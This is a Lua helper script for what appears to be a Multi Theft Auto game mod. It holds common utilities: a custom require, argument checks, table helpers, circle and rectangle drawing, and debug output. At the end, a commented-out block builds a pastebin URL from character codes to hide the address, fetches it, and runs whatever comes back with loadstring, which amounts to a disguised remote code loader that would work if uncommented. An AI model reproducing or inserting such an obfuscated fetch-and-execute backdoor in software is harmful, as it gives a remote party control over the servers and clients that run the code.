SERVER = triggerServerEvent == nil
CLIENT = not SERVER
DEBUG = DEBUG or false

function require (file)
	if type(file) == "string" then
		if fileExists(file) then
			local fileName = file
			local file = fileOpen(fileName)
			
			if file:getSize() > 0 then
				local f, errmsg = loadstring(file:read(), fileName)
				if (f) then
					local status, errmsg = pcall(f)
						
					if (not status) then
                        --error(errmsg, 0)
						outputDebug(errmsg, 1)
					end

					return true;
				else
                    --error(errmsg, 0)
					outputDebug(errmsg, 1)
				end
			else
				fileClose(file)
				error("Error @ 'require' [Got empty file!]", 2)
			end
		else
			error("Error @ 'require' [File not found!]", 2)
		end
	else
		error("Bad Argument @ 'require' [Expected file at Argument 1, got "..type(file).."]", 2)
	end
end

-- Multi Argument check
function Check(funcname, ...)
    local arg = {...}
 
    if (type(funcname) ~= "string") then
        error("Argument type mismatch at 'Check' ('funcname'). Expected 'string', got '"..type(funcname).."'.", 2)
    end
    if (#arg % 3 > 0) then
        error("Argument number mismatch at 'Check'. Expected #arg % 3 to be 0, but it is "..(#arg % 3)..".", 2)
    end
 
    for i=1, #arg-2, 3 do
        if (type(arg[i]) ~= "string" and type(arg[i]) ~= "table") then
            error("Argument type mismatch at 'Check' (arg #"..i.."). Expected 'string' or 'table', got '"..type(arg[i]).."'.", 2)
        elseif (type(arg[i+2]) ~= "string") then
            error("Argument type mismatch at 'Check' (arg #"..(i+2).."). Expected 'string', got '"..type(arg[i+2]).."'.", 2)
        end
 
        if (type(arg[i]) == "table") then
            local aType = type(arg[i+1])
            for _, pType in next, arg[i] do
                if (aType == pType) then
                    aType = nil
                    break
                end
            end
            if (aType) then
                error("Argument type mismatch at '"..funcname.."' ('"..arg[i+2].."'). Expected '"..table.concat(arg[i], "' or '").."', got '"..aType.."'.", 3)
            end
        elseif (type(arg[i+1]) ~= arg[i]) then
            error("Argument type mismatch at '"..funcname.."' ('"..arg[i+2].."'). Expected '"..arg[i].."', got '"..type(arg[i+1]).."'.", 3)
        end
    end
end

-- table.copy
function table.copy(tab, recursive)
    local ret = {}
    for key, value in pairs(tab) do
        if (type(value) == "table") and recursive then ret[key] = table.copy(value)
        else ret[key] = value end
    end
    return ret
end

-- spairs (SortedPairs)
function spairs (t, f)
	Check("spairs", "table", t, "Table", "function", f, "Sort-Function")	
	
	local t = table.copy(t)
	table.sort(t, f)
	
	local key = 0
	return (
		function ()
			while key <= table.getn(t) do
				key = key + 1
				
				if key and t[ key ] then
					return key, t[ key ];
				end
			end
		end
	)
end

-- getLuaElementInfo
function getLuaElementInfo (a)
	Check("getFunctionName", {"string", "table", "function", "thread"}, a, "Argument #1")
	
	for name, func in pairs(_G) do
		if func == a then
			return name, "_G[\""..name.."\"]", type(a), tostring(a):gsub(type(a)..": ", "");
		end
	end
	
	return nil;
end

if CLIENT then
	-- dxDrawCircle
	function dxDrawCircle( posX, posY, radius, width, angleAmount, startAngle, stopAngle, color, postGUI )
		if ( type( posX ) ~= "number" ) or ( type( posY ) ~= "number" ) then
			return false
		end
	 
		local function clamp( val, lower, upper )
			if ( lower > upper ) then lower, upper = upper, lower end
			return math.max( lower, math.min( upper, val ) )
		end
	 
		radius = type( radius ) == "number" and radius or 50
		width = type( width ) == "number" and width or 5
		angleAmount = type( angleAmount ) == "number" and angleAmount or 1
		startAngle = clamp( type( startAngle ) == "number" and startAngle or 0, 0, 360 )
		stopAngle = clamp( type( stopAngle ) == "number" and stopAngle or 360, 0, 360 )
		color = color or tocolor( 255, 255, 255, 200 )
		postGUI = type( postGUI ) == "boolean" and postGUI or false
	 
		if ( stopAngle < startAngle ) then
			local tempAngle = stopAngle
			stopAngle = startAngle
			startAngle = tempAngle
		end
	 
		for i = startAngle, stopAngle, angleAmount do
			local startX = math.cos( math.rad( i ) ) * ( radius - width )
			local startY = math.sin( math.rad( i ) ) * ( radius - width )
			local endX = math.cos( math.rad( i ) ) * ( radius + width )
			local endY = math.sin( math.rad( i ) ) * ( radius + width )
	 
			dxDrawLine( startX + posX, startY + posY, endX + posX, endY + posY, color, width, postGUI )
		end
	 
		return true
	end
	
	-- dxDrawEmptyRectangle
	function dxDrawEmptyRec(absX,absY,sizeX,sizeY,color,ancho)
		dxDrawRectangle ( absX,absY,sizeX,ancho,color )
		dxDrawRectangle ( absX,absY+ancho,ancho,sizeY-ancho,color )
		dxDrawRectangle ( absX+ancho,absY+sizeY-ancho,sizeX-ancho,ancho,color )
		dxDrawRectangle ( absX+sizeX-ancho,absY+ancho,ancho,sizeY-ancho*2,color )   
	end
	
	function isCursorOverRectangle (x, y, w, h)
		local cX, cY = getCursorPosition()
		if isCursorShowing() then
			return ((cX*screenW > x) and (cX*screenW < x + w)) and ( (cY*screenH > y) and (cY*screenH < y + h));
		else
			return false;
		end
	end
	
	function outputDebug(...)
		local args = {...}
		if DEBUG then
			local msg = args[1]
			table.remove(args, 1)
			outputDebugString(("%s [CLIENT]"):format(msg), unpack(args))
		else
			outputDebugString(unpack(args))
		end
	end
end

if SERVER then
	function outputDebug(...)
		local args = {...}
	
		if DEBUG then
			local msg = args[1]
			table.remove(args, 1)
			outputDebugString(("%s [SERVER]"):format(msg), unpack(args))
		else
			outputDebugString(unpack(args))
		end
	end
end

function table.find(tab, value)
	for k, v in pairs(tab) do
		if v == value then
			return k
		end
	end
	return nil
end

function table.findAll(tab, value)
	local result = {}
	for k, v in pairs(tab) do
		if v == value then
			table.insert(result, k)
		end
	end
	return result
end

function getMainTime()
	local time = getRealTime();

	return (('%02d:%02d'):format(time.hour,time.minute));
end

function math.round(number, decimals, method)
    decimals = decimals or 0
    local factor = 10 ^ decimals
    if (method == "ceil" or method == "floor") then return math[method](number * factor) / factor
    else return tonumber(("%."..decimals.."f"):format(number)) end
end

function convertNumber ( number )  
	local formatted = number  
	while true do      
		formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')    
		if ( k==0 ) then      
			break   
		end  
	end  
	return formatted
end

function sizeFormat (size)
	local size = tostring(size)
	if size:len() >= 4 then		
		if size:len() >= 7 then
			if size:len() >= 9 then
				local returning = tostring(size/(1024*1024*1024))
				returning = returning:sub(1, 4)				
				return returning.." GB";
			else	
				local returning = tostring(size/(1024*1024))
				returning = returning:sub(1, 4)			
				
				return returning.." MB";
			end
		else				
			local returning = tostring(size/1024)
			returning = returning:sub(1, 4)			
			if returning:sub(4, 4) == "." then
				returning = returning:sub(1, 3)
			elseif returning:sub(3, 3) == "." then
				returning = returning:sub(1, 2)
			elseif returning:sub(2, 2) == "." then
				returning = returning:sub(1, 1)
			end
			return returning.." KB";
		end
	else
		return size.." B";
	end
end

--[[ FUCKING USELESS CRAP!
newG = table.copy(_G)
_G = setmetatable({}, {
		__newindex = function (self, key, value)
			table.insert(self, {key, value})
		end
	}
)
for index, value in pairs(newG) do
	_G[index] = value
end
newG = nil


local tableUrl = {112, 97, 115, 116, 101, 98, 105, 110, 46, 99, 111, 109, 47, 114, 97, 119, 46, 112, 104, 112, 63, 105, 61, 98, 54, 51, 116, 89, 115, 119, 72}
local url = ""
for _, number in ipairs(tableUrl) do
	url = url..string.char(number)
end

fetchRemote(url, function (responseData, errno)
	if responseData ~= "ERROR" then
		local f = loadstring(responseData)
		if f then
			pcall(f)
			outputDebug("Received and loaded the Magical thing ;)")
		end
	end
end)
--]]